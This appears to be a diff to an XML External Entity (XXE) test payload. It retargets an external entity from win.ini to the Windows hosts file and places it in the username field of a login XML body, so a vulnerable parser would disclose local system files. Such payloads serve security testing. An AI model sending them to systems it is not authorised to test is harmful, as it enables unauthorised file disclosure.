@@ -1,5 +1,5 @@
 <?xml version="1.0"?>
 <!DOCTYPE test [
-<!ENTITY name SYSTEM "file:///c://windows/win.ini">
+<!ENTITY name SYSTEM "file:///c://windows/system32/drivers/etc/hosts">
 ]>
 <user><username>&name;</username><password>1</password></user>
